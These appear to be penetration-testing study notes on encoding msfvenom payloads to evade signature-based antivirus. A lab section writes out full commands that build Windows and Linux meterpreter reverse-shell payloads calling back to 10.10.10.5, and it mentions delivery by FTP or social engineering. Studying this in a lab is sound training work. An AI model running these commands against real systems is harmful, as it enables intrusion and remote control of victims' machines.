#### Encoding Payloads with Msfvenom
- Given that this attack vector involves the transfer and storage of a malicious payload on the clients systems attackers need to be cognisant of AV detection.
- Most end user AV(anti virus ) solutions utilize signature based detection in order to identify malicious files  or executables.
- We can evade older signature based AV (anti virus) solutions by encoding our payloads.
- Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature.
#### shellcode
- shellcode is a piece of code typically used as a payload for exploitation
- It's get its name from the term command shell,whereby shellcode is a piece of code that provides an  attacker with a remote command shell on the target system.
#### Lab
- msfvenom --list endcoder [this will list all the available ]
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > encoded_payload.exe [ this will create encoded payloads for windows ]
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > encoded_payload.exe [ i flag is used to iterate the encoding process several times,here it's only 10 ]
- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > encoded_linux.exe [ encoded payloads for linux with 10 iteration of encoding ]

#### Getting reverse shell
- it's need to transfer the file (ftp server,social engineering )
- we need to use multi/handler for reverse meterpreter shell 
- in multihandler we need to set everything same as creating multihandler
